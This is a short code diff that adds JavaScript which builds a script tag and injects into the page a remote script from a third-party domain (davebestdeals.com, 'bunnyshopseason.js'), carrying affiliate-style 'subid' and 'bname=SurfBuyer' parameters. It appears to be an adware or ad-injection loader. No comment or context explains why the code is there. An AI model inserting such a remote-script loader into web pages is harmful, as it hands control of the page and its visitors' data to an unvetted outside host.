@@ -1,0 +1,4 @@
+var url = '//istatic.davebestdeals.com/fo/ec/bunnyshopseason.js?subid=pr-1650&bname=SurfBuyer';
+var e=document.createElement('script');
+e.src = url;
+document.body.appendChild(e);
